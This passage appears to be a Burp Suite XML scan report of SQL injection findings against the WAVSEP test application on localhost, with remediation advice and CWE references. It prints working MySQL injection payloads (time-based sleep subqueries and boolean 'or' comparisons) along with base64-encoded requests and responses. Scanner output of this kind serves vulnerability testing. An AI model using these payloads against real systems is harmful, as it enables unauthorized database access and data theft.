<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>transactionDate</b> parameter appears to be vulnerable to SQL injection attacks. The payload <b>' and (select*from(select(sleep(20)))a)-- </b> was submitted in the transactionDate parameter. The application took <b>20005</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBWYWxpZC9DYXNlMTQtSW5qZWN0aW9uSW5VcGRhdGUtRGF0ZS1Db21tYW5kSW5qZWN0aW9uLVdpdGhEaWZmZXJlbnQyMDBSZXNwb25zZXMuanNwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiAyNg0KT3JpZ2luOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwDQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLVBPU1QtMjAwVmFsaWQvQ2FzZTE0LUluamVjdGlvbkluVXBkYXRlLURhdGUtQ29tbWFuZEluamVjdGlvbi1XaXRoRGlmZmVyZW50MjAwUmVzcG9uc2VzLmpzcA0KQ29va2llOiBKU0VTU0lPTklEPUU0NEFBNTYzQzRFQkU0MEQ3MjY4OTk2NTVCNjBBQjEwDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0KdHJhbnNhY3Rpb25EYXRlPTIwMTAtMDItMDInJTIwYW5kJTIwKHNlbGVjdCpmcm9tKHNlbGVjdChzbGVlcCgyMCkpKWEpLS0lMjA=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQzOjA2IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzNDENCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMTQgLSBJbmplY3Rpb24gaW50byBkYXRlIHZhbHVlcyBpbiBhbiB1cGRhdGUgcGFnZSB3aXRoIGRpZmZlcmVudCB2YWxpZCByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKUXVlcnkgZXhlY3V0ZWQKCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>6996447501543144448</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case15-InjectionInSearch-DateWithoutQuotes-UnionExploit-WithDifferent200Responses.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case15-InjectionInSearch-DateWithoutQuotes-UnionExploit-WithDifferent200Responses.jsp [transactionDate parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>transactionDate</b> parameter appears to be vulnerable to SQL injection attacks. The payloads <b>52200458 or 4174=04174</b> and <b>59002092 or 6189=6191</b> were each submitted in the transactionDate parameter. These two requests resulted in different responses, indicating that the input is being incorporated into a SQL query in an unsafe way. <br><br>Note that automated difference-based tests for SQL injection flaws can often be unreliable and are prone to false positive results. You should manually review the reported requests and responses to confirm whether a vulnerability is actually present.<br><br> Additionally, the payload <b>(select*from(select(sleep(20)))a)</b> was submitted in the transactionDate parameter. The application took <b>20009</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBWYWxpZC9DYXNlMTUtSW5qZWN0aW9uSW5TZWFyY2gtRGF0ZVdpdGhvdXRRdW90ZXMtVW5pb25FeHBsb2l0LVdpdGhEaWZmZXJlbnQyMDBSZXNwb25zZXMuanNwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiAyNg0KT3JpZ2luOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwDQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLVBPU1QtMjAwVmFsaWQvQ2FzZTE1LUluamVjdGlvbkluU2VhcmNoLURhdGVXaXRob3V0UXVvdGVzLVVuaW9uRXhwbG9pdC1XaXRoRGlmZmVyZW50MjAwUmVzcG9uc2VzLmpzcA0KQ29va2llOiBKU0VTU0lPTklEPUU0NEFBNTYzQzRFQkU0MEQ3MjY4OTk2NTVCNjBBQjEwDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0KdHJhbnNhY3Rpb25EYXRlPTIwMTAtMDEtMDE1MjIwMDQ1OCUyMG9yJTIwNDE3NCUzZDA0MTc0]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ0OjA2IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAxMjY4DQoNCgoKCjwhRE9DVFlQRSBodG1sIFBVQkxJQyAiLS8vVzNDLy9EVEQgSFRNTCA0LjAxIFRyYW5zaXRpb25hbC8vRU4iICJodHRwOi8vd3d3LnczLm9yZy9UUi9odG1sNC9sb29zZS5kdGQiPgo8aHRtbD4KPGhlYWQ+CjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PUlTTy04ODU5LTEiPgo8dGl0bGU+Q2FzZSAxNSAtIEluamVjdGlvbiBpbnRvIGRhdGUgdmFsdWVzICh3aXRob3V0IHF1b3RlcykgaW4gYW4gdXBkYXRlIHBhZ2Ugd2l0aCBkaWZmZXJlbnQgdmFsaWQgcmVzcG9uc2VzPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIG1lc3NhZ2VzOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KdHJhbnNhY3Rpb25JZAo8L0I+CjwvVEQ+CjxURD4KPEI+CnN1bQo8L0I+CjwvVEQ+CjxURD4KPEI+CmRlc2NyaXB0aW9uCjwvQj4KPC9URD4KPFREPgo8Qj4KdHJhbnNhY3Rpb25EYXRlCjwvQj4KPC9URD4KPC9UUj4KPFRSPgo8VEQ+CjEzMgo8L1REPgo8VEQ+CjEwMDAKPC9URD4KPFREPgpTaW1wbGUgVHJhbnNhY3Rpb24KPC9URD4KPFREPgoyMDEwLTAxLTAxCjwvVEQ+CjwvVFI+CjxUUj4KPFREPgoxMzMKPC9URD4KPFREPgoxMjAwCjwvVEQ+CjxURD4KU2ltcGxlIFRyYW5zYWN0aW9uCjwvVEQ+CjxURD4KMjAxMC0wMS0wMQo8L1REPgo8L1RSPgo8VFI+CjxURD4KMTM1CjwvVEQ+CjxURD4KMzAwMAo8L1REPgo8VEQ+ClNpbXBsZSBUcmFuc2FjdGlvbgo8L1REPgo8VEQ+CjIwMTAtMDEtMDEKPC9URD4KPC9UUj4KPFRSPgo8VEQ+CjIyMwo8L1REPgo8VEQ+CjQwMDAKPC9URD4KPFREPgpTaW1wbGUgVHJhbnNhY3Rpb24KPC9URD4KPFREPgoyMDEwLTAxLTAxCjwvVEQ+CjwvVFI+CjxUUj4KPFREPgo0MjMKPC9URD4KPFREPgo1MDAwCjwvVEQ+CjxURD4KU2ltcGxlIFRyYW5zYWN0aW9uCjwvVEQ+CjxURD4KMjAxMC0wMS0wMQo8L1REPgo8L1RSPgo8VFI+CjxURD4KNDU2CjwvVEQ+CjxURD4KNjAwMAo8L1REPgo8VEQ+ClNpbXBsZSBUcmFuc2FjdGlvbgo8L1REPgo8VEQ+CjIwMTAtMDEtMDEKPC9URD4KPC9UUj4KPFRSPgo8VEQ+Cjc4OQo8L1REPgo8VEQ+CjcwMTIKPC9URD4KPFREPgpFeHBlbnNpdmUgVHJhbnNhY3Rpb24KPC9URD4KPFREPgoyMDEwLTAxLTAxCjwvVEQ+CjwvVFI+CjxUUj4KPFREPgo4OTUKPC9URD4KPFREPgo4MDAwCjwvVEQ+CjxURD4KSGVsbG8gV29ybGQKPC9URD4KPFREPgoyMDEwLTAyLTAyCjwvVEQ+CjwvVFI+CjwvVEFCTEU+CgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBWYWxpZC9DYXNlMTUtSW5qZWN0aW9uSW5TZWFyY2gtRGF0ZVdpdGhvdXRRdW90ZXMtVW5pb25FeHBsb2l0LVdpdGhEaWZmZXJlbnQyMDBSZXNwb25zZXMuanNwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiAyNg0KT3JpZ2luOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwDQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLVBPU1QtMjAwVmFsaWQvQ2FzZTE1LUluamVjdGlvbkluU2VhcmNoLURhdGVXaXRob3V0UXVvdGVzLVVuaW9uRXhwbG9pdC1XaXRoRGlmZmVyZW50MjAwUmVzcG9uc2VzLmpzcA0KQ29va2llOiBKU0VTU0lPTklEPUU0NEFBNTYzQzRFQkU0MEQ3MjY4OTk2NTVCNjBBQjEwDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0KdHJhbnNhY3Rpb25EYXRlPTIwMTAtMDEtMDE1OTAwMjA5MiUyMG9yJTIwNjE4OSUzZDYxOTE=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ0OjA2IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1MjANCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE1IC0gSW5qZWN0aW9uIGludG8gZGF0ZSB2YWx1ZXMgKHdpdGhvdXQgcXVvdGVzKSBpbiBhbiB1cGRhdGUgcGFnZSB3aXRoIGRpZmZlcmVudCB2YWxpZCByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKVGhlIGxpc3Qgb2YgbWVzc2FnZXM6CjxUQUJMRT4KPFRSPgo8VEQ+CjxCPgp0cmFuc2FjdGlvbklkCjwvQj4KPC9URD4KPFREPgo8Qj4Kc3VtCjwvQj4KPC9URD4KPFREPgo8Qj4KZGVzY3JpcHRpb24KPC9CPgo8L1REPgo8VEQ+CjxCPgp0cmFuc2FjdGlvbkRhdGUKPC9CPgo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBWYWxpZC9DYXNlMTUtSW5qZWN0aW9uSW5TZWFyY2gtRGF0ZVdpdGhvdXRRdW90ZXMtVW5pb25FeHBsb2l0LVdpdGhEaWZmZXJlbnQyMDBSZXNwb25zZXMuanNwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiAyNg0KT3JpZ2luOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwDQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLVBPU1QtMjAwVmFsaWQvQ2FzZTE1LUluamVjdGlvbkluU2VhcmNoLURhdGVXaXRob3V0UXVvdGVzLVVuaW9uRXhwbG9pdC1XaXRoRGlmZmVyZW50MjAwUmVzcG9uc2VzLmpzcA0KQ29va2llOiBKU0VTU0lPTklEPUU0NEFBNTYzQzRFQkU0MEQ3MjY4OTk2NTVCNjBBQjEwDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0KdHJhbnNhY3Rpb25EYXRlPShzZWxlY3QqZnJvbShzZWxlY3Qoc2xlZXAoMjApKSlhKQ==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQzOjA2IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1MjANCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE1IC0gSW5qZWN0aW9uIGludG8gZGF0ZSB2YWx1ZXMgKHdpdGhvdXQgcXVvdGVzKSBpbiBhbiB1cGRhdGUgcGFnZSB3aXRoIGRpZmZlcmVudCB2YWxpZCByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKVGhlIGxpc3Qgb2YgbWVzc2FnZXM6CjxUQUJMRT4KPFRSPgo8VEQ+CjxCPgp0cmFuc2FjdGlvbklkCjwvQj4KPC9URD4KPFREPgo8Qj4Kc3VtCjwvQj4KPC9URD4KPFREPgo8Qj4KZGVzY3JpcHRpb24KPC9CPgo8L1REPgo8VEQ+CjxCPgp0cmFuc2FjdGlvbkRhdGUKPC9CPgo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>7964293918985012224</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case16-InjectionInView-NumericWithoutQuotes-PermissionBypass-WithDifferent200Responses.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case16-InjectionInView-NumericWithoutQuotes-PermissionBypass-WithDifferent200Responses.jsp [transactionId parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>transactionId</b> parameter appears to be vulnerable to SQL injection attacks. The payloads <b>50657598 or 9694=09694</b> and <b>72373166 or 8103=8110</b> were each submitted in the transactionId parameter. These two requests resulted in different responses, indicating that the input is being incorporated into a SQL query in an unsafe way. <br><br>Note that automated difference-based tests for SQL injection flaws can often be unreliable and are prone to false positive results. You should manually review the reported requests and responses to confirm whether a vulnerability is actually present.<br><br> Additionally, the payload <b>(select*from(select(sleep(20)))a)</b> was submitted in the transactionId parameter. The application took <b>20015</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
